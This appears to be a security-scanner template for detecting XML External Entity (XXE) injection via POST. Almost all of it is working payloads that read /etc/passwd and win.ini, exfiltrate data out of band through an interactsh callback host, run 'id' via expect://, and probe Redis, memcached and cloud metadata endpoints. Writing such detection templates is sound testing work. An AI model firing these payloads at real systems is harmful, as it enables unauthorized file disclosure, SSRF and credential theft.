id: xxe-file-disclosure-post

info:
  name: XXE - XML External Entity File Disclosure (POST)
  author: security-team
  severity: critical
  description: |
    Tests for XML External Entity (XXE) injection vulnerability via POST request.
    Attempts to disclose sensitive files like /etc/passwd, config files, and SSH keys.
    Also tests for SSRF, RCE, and blind XXE vulnerabilities.
  reference:
    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
    - https://portswigger.net/web-security/xxe
  tags: xxe,xml,injection,file-disclosure,ssrf,rce,owasp,top10
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-611

http:
  - raw:
      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root><data>&xxe;</data></root>

      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
        <root><data>&xxe;</data></root>

      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{interactsh-url}}/xxe">]>
        <root><data>&xxe;</data></root>

      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY % file SYSTEM "file:///etc/passwd">
          <!ENTITY % dtd SYSTEM "http://{{interactsh-url}}/evil.dtd">
          %dtd;
        ]>
        <root></root>

      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://{{interactsh-url}}/xxe">]>
        <root><data>&xxe;</data></root>

      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
        <root><data>&xxe;</data></root>

      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:80/">]>
        <root><data>&xxe;</data></root>

      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:6379/">]>
        <root><data>&xxe;</data></root>

      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://localhost:11211/stats">]>
        <root><data>&xxe;</data></root>

      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
        <root><data>&xxe;</data></root>

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - '(?im)^(?:root|daemon|bin):.*:0:0:'
          - '(?im)root:x:0:0'
          - 'www-data'
          - 'PATH=/usr/local'
          - 'for 16-bit app support'
        condition: or

      - type: regex
        part: body
        regex:
          - '(?m)uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)'
        condition: or

      - type: word
        part: body
        words:
          - redis_version
          - connected_clients
          - STAT version
          - ami-id
          - instance-id
          - local-hostname
        condition: or

      - type: word
        part: interactsh_protocol
        words:
          - http
          - ftp
          - dns
        condition: or

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '(?m)^root:x:0:0:([^:\n]*)'
          - '(PATH=[^\n]+)'
          - '(uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\))'
